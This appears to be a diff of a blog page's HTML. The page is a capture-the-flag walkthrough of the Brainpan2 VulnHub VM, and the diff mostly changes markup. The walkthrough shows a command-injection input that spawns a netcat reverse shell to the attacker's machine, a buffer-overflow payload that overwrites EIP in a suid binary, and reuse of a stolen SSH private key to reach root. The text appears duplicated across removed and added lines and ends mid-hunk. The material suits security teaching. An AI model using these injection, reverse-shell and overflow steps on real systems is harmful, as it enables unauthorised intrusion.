@@ -101,17 +101,12 @@
 
 
 
-  <p>Brainpan2 was a fun challenge competition made by @superkojiman. From the beginner to the end I felt that I was being trolled and to be honest, I was! ;&ndash;) Thanks VulnHub and @superkojiman for such an entertainment, can&rsquo;t wait for the next one.</p>
-
-<!-- more -->
-
-
-
+  <p>Brainpan2 was a fun challenge competition made by @superkojiman. From the beginner to the end I felt that I was being trolled and to be honest, I was! ;-) Thanks VulnHub and @superkojiman for such an entertainment, can’t wait for the next one.
+<!-- more --></p>
 
 <h3> Poking around </h3>
 
-
-<p>A Nmap scan would show me what expect in brainpan2, and it did! Only 2 TCP ports were stated open, 9999 as Unknown and 10000 running &lsquo;SimpleHTTP 0.6&rsquo;.</p>
+<p>A Nmap scan would show me what expect in brainpan2, and it did! Only 2 TCP ports were stated open, 9999 as Unknown and 10000 running ‘SimpleHTTP 0.6’.</p>
 
 <div class="window">
           <nav class="control-window">
@@ -120,41 +115,35 @@
             <a href="#" class="deactivate">deactivate</a>
           </nav>
           <h1 class="titleInside">Terminal</h1>
-          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ nmap -sS  -T5 192.168.1.35 -p1-</span><span class='line output'>
-</span><span class='line output'>Starting Nmap 6.40 ( http://nmap.org ) at 2014-05-22 12:13 EST
-</span><span class='line output'>Nmap scan report for . (192.168.1.35)
-</span><span class='line output'>Host is up (0.00072s latency).
-</span><span class='line output'>Not shown: 65533 closed ports
-</span><span class='line output'>PORT      STATE SERVICE
-</span><span class='line output'>9999/tcp  open  abyss
-</span><span class='line output'>10000/tcp open  snet-sensor-mgmt
-</span><span class='line output'>MAC Address: 00:0C:29:82:A8:00 (VMware)
-</span><span class='line output'>
-</span><span class='line output'>Nmap done: 1 IP address (1 host up) scanned in 5.80 seconds</span></code></pre></td></tr></table></div></div>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line command">$ nmap -sS  -T5 192.168.1.35 -p1-</span><span class="line output">
+</span><span class="line output">Starting Nmap 6.40 ( http://nmap.org ) at 2014-05-22 12:13 EST
+</span><span class="line output">Nmap scan report for . (192.168.1.35)
+</span><span class="line output">Host is up (0.00072s latency).
+</span><span class="line output">Not shown: 65533 closed ports
+</span><span class="line output">PORT      STATE SERVICE
+</span><span class="line output">9999/tcp  open  abyss
+</span><span class="line output">10000/tcp open  snet-sensor-mgmt
+</span><span class="line output">MAC Address: 00:0C:29:82:A8:00 (VMware)
+</span><span class="line output">
+</span><span class="line output">Nmap done: 1 IP address (1 host up) scanned in 5.80 seconds</span></code></pre></td></tr></table></div></div>
         </div>
-
-
-<p>By picking one port to start with, I picked the web port 10000. When first requested in browser a graph of cyber attacks was displayed and I quickly ran &lsquo;dirb&rsquo; to bruteforce possible directories on the web application.
-I found &lsquo;/bin&rsquo; directory, containing an executable file called &lsquo;brainpan.exe&rsquo;.
+<p>By picking one port to start with, I picked the web port 10000. When first requested in browser a graph of cyber attacks was displayed and I quickly ran ‘dirb’ to bruteforce possible directories on the web application. 
+I found ‘/bin’ directory, containing an executable file called ‘brainpan.exe’.
 Using wget, I downloaded brainpan.exe and used file command to read those first 64 words of the file header pointing me what kind of file am I dealing with:</p>
 
-<p><section>
-  <p class="lead"></p>
+<section>
+  <p class="lead"> 
+    brainpan.exe: JPEG image data, JFIF standard 1.01, comment: &#8220;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85&#8221;
 
-<pre><code>brainpan.exe: JPEG image data, JFIF standard 1.01, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85"
-</code></pre>
 
-<p></section></p>
-
-<p>Renamed from .exe to .jpg and opened, look what I got:</p>
+Renamed from .exe to .jpg and opened, look what I got:
 
 <center>
-<img src="/images/brainpan1.jpg">
+<img src="/images/brainpan1.jpg" />
 </center>
 
-
-<p>After digging a bit I can say that it is a normal JPG file! A properly look into SimpleHTTP 0.6 python application spend part of my time and ended up with nothing.
-Let&rsquo;s jump right into port 9999 and see how far I can go with it.</p>
+After digging a bit I can say that it is a normal JPG file! A properly look into SimpleHTTP 0.6 python application spend part of my time and ended up with nothing. 
+Let&#8217;s jump right into port 9999 and see how far I can go with it.
 
 <div class="window">
           <nav class="control-window">
@@ -163,33 +152,27 @@ Let&rsquo;s jump right into port 9999 and see how far I can go with it.</p>
             <a href="#" class="deactivate">deactivate</a>
           </nav>
           <h1 class="titleInside">Terminal</h1>
-          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ nc 192.168.1.35 9999</span><span class='line output'>_|                            _|                                        
-</span><span class='line output'>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
-</span><span class='line output'>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
-</span><span class='line output'>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
-</span><span class='line output'>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
-</span><span class='line output'>                                            _|                          
-</span><span class='line output'>                                            _|
-</span><span class='line output'>
-</span><span class='line output'>[______________________ WELCOME TO BRAINPAN 2.0________________________]
-</span><span class='line output'>                             LOGIN AS GUEST                             
-</span><span class='line output'>
-</span><span class='line output'>                          >></span></code></pre></td></tr></table></div></div>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line command">$ nc 192.168.1.35 9999</span><span class="line output">_|                            _|                                        
+</span><span class="line output">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+</span><span class="line output">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+</span><span class="line output">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+</span><span class="line output">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+</span><span class="line output">                                            _|                          
+</span><span class="line output">                                            _|
+</span><span class="line output">
+</span><span class="line output">[______________________ WELCOME TO BRAINPAN 2.0________________________]
+</span><span class="line output">                             LOGIN AS GUEST                             
+</span><span class="line output">
+</span><span class="line output">                          &gt;&gt;</span></code></pre></td></tr></table></div></div>
         </div>
-
-
-
 
 <h3> First Shell </h3>
 
-
-<p>I managed to gain a non-privileged shell access by abusing the shell escape technique <a href='http://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells'> (See Reference) </a>.
-&lsquo;Login as GUEST&rsquo;, pretty much suggests how to login into the application, and a &lsquo;VIEW&rsquo; command allows me to get any local file with reading privileges.
-I&rsquo;ve set NetCat waiting for connections on port 1111 on attacker machine, to brainpan2 reverse connect occurs bring me shell access.</p>
+I managed to gain a non-privileged shell access by abusing the shell escape technique <a href="http://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells"> (See Reference) </a>.
+&#8216;Login as GUEST&#8217;, pretty much suggests how to login into the application, and a &#8216;VIEW&#8217; command allows me to get any local file with reading privileges.
+I&#8217;ve set NetCat waiting for connections on port 1111 on attacker machine, to brainpan2 reverse connect occurs bring me shell access.
 
 <h6>Command Escape</h6>
-
-
 <div class="window">
           <nav class="control-window">
             <a href="#finder" class="close" data-rel="close">close</a>
@@ -197,30 +180,25 @@ I&rsquo;ve set NetCat waiting for connections on port 1111 on attacker machine, 
             <a href="#" class="deactivate">deactivate</a>
           </nav>
           <h1 class="titleInside">Terminal</h1>
-          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line output'>>> GUEST
-</span><span class='line output'>                          ACCESS GRANTED
-</span><span class='line output'>
-</span><span class='line output'>
-</span><span class='line output'>                             *  *  *  *                                
-</span><span class='line output'>    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
-</span><span class='line output'>    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
-</span><span class='line output'>                             *  *  *  *                                
-</span><span class='line output'>
-</span><span class='line output'>
-</span><span class='line output'>                          >> TELL ME MORE
-</span><span class='line output'>    FILES    HELP    VIEW       CREATE
-</span><span class='line output'>    USERS    MSG     SYSTEM     BYE
-</span><span class='line output'>
-</span><span class='line output'>                          >> VIEW
-</span><span class='line output'>    ENTER FILE TO DOWNLOAD: ie |nc 192.168.1.10 1111 -e /bin/bash</span></code></pre></td></tr></table></div></div>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line output">&gt;&gt; GUEST
+</span><span class="line output">                          ACCESS GRANTED
+</span><span class="line output">
+</span><span class="line output">
+</span><span class="line output">                             *  *  *  *                                
+</span><span class="line output">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
+</span><span class="line output">    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
+</span><span class="line output">                             *  *  *  *                                
+</span><span class="line output">
+</span><span class="line output">
+</span><span class="line output">                          &gt;&gt; TELL ME MORE
+</span><span class="line output">    FILES    HELP    VIEW       CREATE
+</span><span class="line output">    USERS    MSG     SYSTEM     BYE
+</span><span class="line output">
+</span><span class="line output">                          &gt;&gt; VIEW
+</span><span class="line output">    ENTER FILE TO DOWNLOAD: ie |nc 192.168.1.10 1111 -e /bin/bash</span></code></pre></td></tr></table></div></div>
         </div>
-
-
-
 
 <h6> Reverse Connected </h6>
-
-
 <div class="window">
           <nav class="control-window">
             <a href="#finder" class="close" data-rel="close">close</a>
@@ -228,39 +206,61 @@ I&rsquo;ve set NetCat waiting for connections on port 1111 on attacker machine, 
             <a href="#" class="deactivate">deactivate</a>
           </nav>
           <h1 class="titleInside">Terminal</h1>
-          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ nc -vlp 1111</span><span class='line output'>nc: listening on :: 1111 ...
-</span><span class='line output'>nc: listening on 0.0.0.0 1111 ...
-</span><span class='line output'>nc: connect to 192.168.1.10 1111 from . (192.168.1.35) 37001 [37001]
-</span><span class='line output'>id
-</span><span class='line output'>uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
-</span><span class='line output'>python -c 'import pty;pty.spawn("/bin/bash")'
-</span><span class='line output'>anansi@brainpan2:/opt/brainpan$</span></code></pre></td></tr></table></div></div>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line command">$ nc -vlp 1111</span><span class="line output">nc: listening on :: 1111 ...
+</span><span class="line output">nc: listening on 0.0.0.0 1111 ...
+</span><span class="line output">nc: connect to 192.168.1.10 1111 from . (192.168.1.35) 37001 [37001]
+</span><span class="line output">id
+</span><span class="line output">uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
+</span><span class="line output">python -c 'import pty;pty.spawn("/bin/bash")'
+</span><span class="line output">anansi@brainpan2:/opt/brainpan$</span></code></pre></td></tr></table></div></div>
         </div>
-
-
-
 
 <h3> Escalate Privileges </h3>
 
+Escalate privileges would be painful or even &#8216;impossible&#8217; without a long enumeration process on the way, as much as you collect information from target you get closer to the final escalation. If you are struggling, there&#8217;s a good <a href="http://www.rebootuser.com/?p=1623"> Escalation CheatSheet </a> that could be used.
 
-<p>Escalate privileges would be painful or even &lsquo;impossible&rsquo; without a long enumeration process on the way, as much as you collect information from target you get closer to the final escalation. If you are struggling, there&rsquo;s a good <a href='http://www.rebootuser.com/?p=1623'> Escalation CheatSheet </a> that could be used.</p>
+Looking up for suid file are always a good call! On &#8216;/home/reynard&#8217; a binaray called &#8216;msg_root&#8217; holds suid as root and is vulnerable to BOF (Buffer Overflow). The &#8216;strings&#8217; command output shows what function the binary are using and is easy to identify vulnerable ones. 
 
-<p>Looking up for suid file are always a good call! On &lsquo;/home/reynard&rsquo; a binaray called &lsquo;msg_root&rsquo; holds suid as root and is vulnerable to BOF (Buffer Overflow). The &lsquo;strings&rsquo; command output shows what function the binary are using and is easy to identify vulnerable ones.</p>
+<section>
+  <p class="lead"> 
+    msg_root: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xb8fa383bdc6bb917a22e57f547aaa4f5383181e6, not stripped
+    -rwsr-xr-x 1 root root 8999 Nov  6  2013 msg_root&gt;
 
-<p><section>
-  <p class="lead"></p>
 
-<pre><code>msg_root: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xb8fa383bdc6bb917a22e57f547aaa4f5383181e6, not stripped
--rwsr-xr-x 1 root root 8999 Nov  6  2013 msg_root&gt;
-</code></pre>
+I copied the binary using scp to attacker machine (you still can use netcat to transfer small files). Once msg_root is transfered, let&#8217;s exploit it.
 
-<p></section></p>
-
-<p>I copied the binary using scp to attacker machine (you still can use netcat to transfer small files). Once msg_root is transfered, let&rsquo;s exploit it.</p>
 
 <h3>Binary Exploit</h3>
 
+<div class="window">
+          <nav class="control-window">
+            <a href="#finder" class="close" data-rel="close">close</a>
+            <a href="#" class="minimize">minimize</a>
+            <a href="#" class="deactivate">deactivate</a>
+          </nav>
+          <h1 class="titleInside">Terminal</h1>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line command">$ gdb ./msg_root  -q</span><span class="line output">Reading symbols from /root/msg_root...done.
+</span><span class="line output">(gdb) run $(python -c "print '\x41' * 14 + '\x42' * 4") msg
+</span><span class="line output">Starting program: /root/msg_root $(python -c "print '\x41' * 14 + '\x42' * 4") msg
+</span><span class="line output">
+</span><span class="line output">Program received signal SIGSEGV, Segmentation fault.
+</span><span class="line output">0x42424242 in ?? ()</span></code></pre></td></tr></table></div></div>
+        </div>
 
+Let&#8217;s loading the &#8216;msg_root&#8217; binary using GDB and send a couple of junk. <strong> Note, I will not demostrate the pattern_create and pattern_offset process</strong>, both tools can be found at &#8216;/usr/share/metasploit-framework/tools&#8217;.
+When sent 14 bytes of junk, the next byte will overwrite EIP (+4), however, when &#8216;jmp esp&#8217; instruction is called, I don&#8217;t have enought space to place my shellcode into memory, so, how do I do then ? 
+
+What if I place my shellcode inside the linux environment path and point EIP to the address path? Would work isn&#8217;t ? Yeah! It would! If you want to read about Small Buffer Overflows, I recommend the <a href="http://insecure.org/stf/smashstack.html"> &#8216;Smashing the Stack for Fun and Profit&#8217; </a> by Aleph One.
+
+See Exploit used to perform this task <a href="/download/brainpan2"> HERE</a>. The &#8216;eggcode.c&#8217; loads the shellcode into the linux variable path and &#8216;findeggaddr.c&#8217; gets the memory address where the shellcode is at. Both C files were compliled on attacker machine and placed on target.
+
+<section>
+  <p class="lead"> 
+    ./eggcode &amp;&amp; ./findeggaddr
+    EGG address: 0xbffffd6e
+
+
+<strong>0xbffffd6e</strong> this is the address where the shellcode lives. Let&#8217;s exploit the binary using this address to overwrite EIP.
 
 
 <div class="window">
@@ -270,102 +270,40 @@ I&rsquo;ve set NetCat waiting for connections on port 1111 on attacker machine, 
             <a href="#" class="deactivate">deactivate</a>
           </nav>
           <h1 class="titleInside">Terminal</h1>
-          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ gdb ./msg_root  -q</span><span class='line output'>Reading symbols from /root/msg_root...done.
-</span><span class='line output'>(gdb) run $(python -c "print '\x41' * 14 + '\x42' * 4") msg
-</span><span class='line output'>Starting program: /root/msg_root $(python -c "print '\x41' * 14 + '\x42' * 4") msg
-</span><span class='line output'>
-</span><span class='line output'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line output'>0x42424242 in ?? ()</span></code></pre></td></tr></table></div></div>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line command">$ ./eggcode</span><span class="line output">	./findeggaddr
+</span><span class="line output">	EGG address: 0xbffffd6e
+</span><span class="line output">	/home/reynard/msg_root $(python -c "print 'A' * 14 + '\x6e\xfd\xff\xbf'") msg
+</span><span class="line output">	AhmadUUMUni
+</span><span class="line output">	id
+</span><span class="line output">	uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
+</span><span class="line output">	cat /root/flag.txt
+</span><span class="line output">	cat: flag.txt: Permission denied
+</span><span class="line output">	ls /root
+</span><span class="line output">	flag.txt whatif.txt
+</span><span class="line output">	cat whatif.txt
+</span><span class="line output">
+</span><span class="line output">
+</span><span class="line output">       WHAT IF I TOLD YOU
+</span><span class="line output">              ___
+</span><span class="line output">            /     \ 
+</span><span class="line output">           | ______\
+</span><span class="line output">          (, \_/ \_/
+</span><span class="line output">           |   ._. |
+</span><span class="line output">           \   --- /
+</span><span class="line output">           /`-.__.'
+</span><span class="line output">      .---'`-.___|\___
+</span><span class="line output">     /                `.
+</span><span class="line output">
+</span><span class="line output">       YOU ARE NOT ROOT?
+</span><span class="line output">    id "root "
+</span><span class="line output">	uid=0(root ) gid=0(root ) groups=0(root )</span></code></pre></td></tr></table></div></div>
         </div>
 
-
-<p>Let&rsquo;s loading the &lsquo;msg_root&rsquo; binary using GDB and send a couple of junk. <strong> Note, I will not demostrate the pattern_create and pattern_offset process</strong>, both tools can be found at &lsquo;/usr/share/metasploit-framework/tools&rsquo;.
-When sent 14 bytes of junk, the next byte will overwrite EIP (+4), however, when &lsquo;jmp esp&rsquo; instruction is called, I don&rsquo;t have enought space to place my shellcode into memory, so, how do I do then ?</p>
-
-<p>What if I place my shellcode inside the linux environment path and point EIP to the address path? Would work isn&rsquo;t ? Yeah! It would! If you want to read about Small Buffer Overflows, I recommend the <a href="http://insecure.org/stf/smashstack.html"> &lsquo;Smashing the Stack for Fun and Profit&rsquo; </a> by Aleph One.</p>
-
-<p>See Exploit used to perform this task <a href="/download/brainpan2"> HERE</a>. The &lsquo;eggcode.c&rsquo; loads the shellcode into the linux variable path and &lsquo;findeggaddr.c&rsquo; gets the memory address where the shellcode is at. Both C files were compliled on attacker machine and placed on target.</p>
-
-<p><section>
-  <p class="lead"></p>
-
-<pre><code>./eggcode &amp;&amp; ./findeggaddr
-EGG address: 0xbffffd6e
-</code></pre>
-
-<p></section></p>
-
-<p><strong>0xbffffd6e</strong> this is the address where the shellcode lives. Let&rsquo;s exploit the binary using this address to overwrite EIP.</p>
-
-<div class="window">
-          <nav class="control-window">
-            <a href="#finder" class="close" data-rel="close">close</a>
-            <a href="#" class="minimize">minimize</a>
-            <a href="#" class="deactivate">deactivate</a>
-          </nav>
-          <h1 class="titleInside">Terminal</h1>
-          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ ./eggcode</span><span class='line output'>   ./findeggaddr
-</span><span class='line output'>   EGG address: 0xbffffd6e
-</span><span class='line output'>   /home/reynard/msg_root $(python -c "print 'A' * 14 + '\x6e\xfd\xff\xbf'") msg
-</span><span class='line output'>   AhmadUUMUni
-</span><span class='line output'>   id
-</span><span class='line output'>   uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
-</span><span class='line output'>   cat /root/flag.txt
-</span><span class='line output'>   cat: flag.txt: Permission denied
-</span><span class='line output'>   ls /root
-</span><span class='line output'>   flag.txt whatif.txt
-</span><span class='line output'>   cat whatif.txt
-</span><span class='line output'>
-</span><span class='line output'>
-</span><span class='line output'>       WHAT IF I TOLD YOU
-</span><span class='line output'>              ___
-</span><span class='line output'>            /     \ 
-</span><span class='line output'>           | ______\
-</span><span class='line output'>          (, \_/ \_/
-</span><span class='line output'>           |   ._. |
-</span><span class='line output'>           \   --- /
-</span><span class='line output'>           /`-.__.'
-</span><span class='line output'>      .---'`-.___|\___
-</span><span class='line output'>     /                `.
-</span><span class='line output'>
-</span><span class='line output'>       YOU ARE NOT ROOT?
-</span><span class='line output'>    id "root "
-</span><span class='line output'>   uid=0(root ) gid=0(root ) groups=0(root )</span></code></pre></td></tr></table></div></div>
-        </div>
-
-
-<p>What ??? What if I told you&hellip; No way&hellip; It&rsquo;s not done yet! root isn&rsquo;t root, root user is &ldquo;root &rdquo;!</p>
+What ??? What if I told you&#8230; No way&#8230; It&#8217;s not done yet! root isn&#8217;t root, root user is &#8220;root &#8220;! 
 
 <h3> Second Enumeration </h3>
 
-
-<p>After another closer look into Suid files I ended up with &lsquo;/opt/old/brainpan-1.8/brainpan-1.8.exe&rsquo; but this time the exe isn&rsquo;t a JPG file! It&rsquo;s a ELF binaray that holds suid for the user &lsquo;puck&rsquo;.</p>
-
-<div class="window">
-          <nav class="control-window">
-            <a href="#finder" class="close" data-rel="close">close</a>
-            <a href="#" class="minimize">minimize</a>
-            <a href="#" class="deactivate">deactivate</a>
-          </nav>
-          <h1 class="titleInside">Terminal</h1>
-          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ pwd</span><span class='line output'>  /opt/old/brainpan-1.8
-</span><span class='line output'>  ls -lha
-</span><span class='line output'>  total 36K
-</span><span class='line output'>  drwxrwxr-x 2 root  staff 4.0K Nov  5  2013 .
-</span><span class='line output'>  drwx------ 3 root  root  4.0K Nov  4  2013 ..
-</span><span class='line output'>  -rwsr-xr-x 1 puck  puck   18K Nov  4  2013 brainpan-1.8.exe
-</span><span class='line output'>  -rw-r--r-- 1 puck  puck  1.2K Nov  5  2013 brainpan.7
-</span><span class='line output'>  -rw-rw-rw- 1 puck  staff   27 Nov  5  2013 brainpan.cfg
-</span><span class='line output'>  cat brainpan.cfg
-</span><span class='line output'>  port=9333
-</span><span class='line output'>  ipaddr=127.0.0.1
-</span><span class='line output'>  file brainpan-1.8.exe
-</span><span class='line output'>  brainpan-1.8.exe: setuid ELF 32-bit LSB executable, Intel 80386, version 1(SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xcce373746445bee7531358c8b349018de08ec1f3, not stripped</span></code></pre></td></tr></table></div></div>
-        </div>
-
-
-<p>I quickly changed the &lsquo;brainpan.cfg&rsquo; configuration file by replace loopback address &lsquo;127.0.0.1&rsquo; to &lsquo;192.168.1.35&rsquo; (in my case) and ran the binary &lsquo;./brainpan-1.8.exe&rsquo;.
-Once connected, using netcat on port 9333, I did exactly like the firs shell; abusing of command ecapes on VIEW command once logged as GUEST.</p>
+After another closer look into Suid files I ended up with &#8216;/opt/old/brainpan-1.8/brainpan-1.8.exe&#8217; but this time the exe isn&#8217;t a JPG file! It&#8217;s a ELF binaray that holds suid for the user &#8216;puck&#8217;.
 
 <div class="window">
           <nav class="control-window">
@@ -374,45 +312,62 @@ Once connected, using netcat on port 9333, I did exactly like the firs shell; ab
             <a href="#" class="deactivate">deactivate</a>
           </nav>
           <h1 class="titleInside">Terminal</h1>
-          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ nc -vlp 1212</span><span class='line output'>    nc: listening on :: 1212 ...
-</span><span class='line output'>    nc: listening on 0.0.0.0 1212 ...
-</span><span class='line output'>    nc: connect to 192.168.1.10 1212 from . (192.168.1.35) 44679 [44679]
-</span><span class='line output'>    id
-</span><span class='line output'>    uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)</span></code></pre></td></tr></table></div></div>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line command">$ pwd</span><span class="line output">  /opt/old/brainpan-1.8
+</span><span class="line output">  ls -lha
+</span><span class="line output">  total 36K
+</span><span class="line output">  drwxrwxr-x 2 root  staff 4.0K Nov  5  2013 .
+</span><span class="line output">  drwx------ 3 root  root  4.0K Nov  4  2013 ..
+</span><span class="line output">  -rwsr-xr-x 1 puck  puck   18K Nov  4  2013 brainpan-1.8.exe
+</span><span class="line output">  -rw-r--r-- 1 puck  puck  1.2K Nov  5  2013 brainpan.7
+</span><span class="line output">  -rw-rw-rw- 1 puck  staff   27 Nov  5  2013 brainpan.cfg
+</span><span class="line output">  cat brainpan.cfg
+</span><span class="line output">  port=9333
+</span><span class="line output">  ipaddr=127.0.0.1
+</span><span class="line output">  file brainpan-1.8.exe
+</span><span class="line output">  brainpan-1.8.exe: setuid ELF 32-bit LSB executable, Intel 80386, version 1(SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xcce373746445bee7531358c8b349018de08ec1f3, not stripped</span></code></pre></td></tr></table></div></div>
         </div>
 
+I quickly changed the &#8216;brainpan.cfg&#8217; configuration file by replace loopback address &#8216;127.0.0.1&#8217; to &#8216;192.168.1.35&#8217; (in my case) and ran the binary &#8216;./brainpan-1.8.exe&#8217;.
+Once connected, using netcat on port 9333, I did exactly like the firs shell; abusing of command ecapes on VIEW command once logged as GUEST.
 
-<p>Good! Shell connected as &lsquo;puck&rsquo; user. First thing to do is to browser into &lsquo;puck&rsquo; home directory.
-Note that SSH is active on port 2222 accepting connections from localhost, only.</p>
+<div class="window">
+          <nav class="control-window">
+            <a href="#finder" class="close" data-rel="close">close</a>
+            <a href="#" class="minimize">minimize</a>
+            <a href="#" class="deactivate">deactivate</a>
+          </nav>
+          <h1 class="titleInside">Terminal</h1>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line command">$ nc -vlp 1212</span><span class="line output">    nc: listening on :: 1212 ...
+</span><span class="line output">    nc: listening on 0.0.0.0 1212 ...
+</span><span class="line output">    nc: connect to 192.168.1.10 1212 from . (192.168.1.35) 44679 [44679]
+</span><span class="line output">    id
+</span><span class="line output">    uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)</span></code></pre></td></tr></table></div></div>
+        </div>
 
-<p><section>
- <p class="lead"></p>
+Good! Shell connected as &#8216;puck&#8217; user. First thing to do is to browser into &#8216;puck&#8217; home directory.
+Note that SSH is active on port 2222 accepting connections from localhost, only.
 
-<pre><code>tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -               
-</code></pre>
-
-<p></section></p>
-
-<p>On &lsquo;puck&rsquo; home directory, I have found a .backup directory with .bash_history accessible!
-Let&rsquo;s look inside this history file:
 <section>
- <p class"lead"></p>
+ <p class="lead">
+ 	tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -               
 
-<pre><code>ssh -l "root " brainpan2
-cat .bash_history 
-ls
-mkdir .backup
-mv .ssh .bash* .backup
-</code></pre>
 
-<p></section></p>
+On &#8216;puck&#8217; home directory, I have found a .backup directory with .bash_history accessible!
+Let&#8217;s look inside this history file:
+<section>
+ &lt;p class&#8221;lead&#8221;&gt;
+ 	ssh -l &#8220;root &#8221; brainpan2
+ 	cat .bash_history 
+ 	ls
+ 	mkdir .backup
+ 	mv .ssh .bash* .backup
+</section>
 
-<p>Huumm&hellip; ;&ndash;)</p>
+Huumm&#8230; ;-)
 
 <h3> Hands on the flag </h3>
 
-
-<p>I know that RSA SSH keys lives on .backup inside &lsquo;puck&rsquo; home directory, however, euid (SUID) will not allow me to connect using the key directly from .backup, so I copied id_rsa to &lsquo;/tmp&rsquo;, giving the file rights permission and SSH should not ask for any password once using the private RSA key.</p>
+I know that RSA SSH keys lives on .backup inside &#8216;puck&#8217; home directory, however, euid (SUID) will not allow me to connect using the key directly from .backup, so I copied id_rsa to &#8216;/tmp&#8217;, giving the file rights permission and SSH should not ask for any password once using the private RSA key.
 
 <div class="window">
           <nav class="control-window">
@@ -421,44 +376,53 @@ mv .ssh .bash* .backup
             <a href="#" class="deactivate">deactivate</a>
           </nav>
           <h1 class="titleInside">Terminal</h1>
-          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>$ ssh -l "root " brainpan2 -p 2222 -i id_rsa</span><span class='line output'>ssh -l "root " brainpan2 -p 2222 -i id_rsa
-</span><span class='line output'>Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
-</span><span class='line output'>
-</span><span class='line output'>The programs included with the Debian GNU/Linux system are free software;
-</span><span class='line output'>the exact distribution terms for each program are described in the
-</span><span class='line output'>individual files in /usr/share/doc/*/copyright.
-</span><span class='line output'>
-</span><span class='line output'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-</span><span class='line output'>permitted by applicable law.
-</span><span class='line output'>Last login: Thu May 22 05:48:53 2014 from localhost
-</span><span class='line output'>root @brainpan2:~# cat /root/flag.txt
-</span><span class='line output'>cat /root/flag.txt
-</span><span class='line output'>
-</span><span class='line output'>                          !!! CONGRATULATIONS !!!
-</span><span class='line output'>
-</span><span class='line output'>                 You've completed the Brainpan 2 challenge! 
-</span><span class='line output'>                 Or have you...? 
-</span><span class='line output'>
-</span><span class='line output'>                 Yes, you have! Pat yourself on the back. :-)
-</span><span class='line output'>
-</span><span class='line output'>                 Questions, comments, suggestions for new VM
-</span><span class='line output'>                 challenges? Let me know! 
-</span><span class='line output'>
-</span><span class='line output'>
-</span><span class='line output'>                 Twitter: @superkojiman
-</span><span class='line output'>                 Email  : contact@techorganic.com
-</span><span class='line output'>                 Web    : http://www.techorganic.com
-</span><span class='line output'>
-</span><span class='line output'>root @brainpan2:~# id
-</span><span class='line output'>id
-</span><span class='line output'>uid=0(root ) gid=0(root ) groups=0(root )
-</span><span class='line output'>root @brainpan2:~#</span></code></pre></td></tr></table></div></div>
+          <div class="container"><div class="terminal"><table><tr><td class="code"><pre><code><span class="line command">$ ssh -l "root " brainpan2 -p 2222 -i id_rsa</span><span class="line output">ssh -l "root " brainpan2 -p 2222 -i id_rsa
+</span><span class="line output">Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
+</span><span class="line output">
+</span><span class="line output">The programs included with the Debian GNU/Linux system are free software;
+</span><span class="line output">the exact distribution terms for each program are described in the
+</span><span class="line output">individual files in /usr/share/doc/*/copyright.
+</span><span class="line output">
+</span><span class="line output">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class="line output">permitted by applicable law.
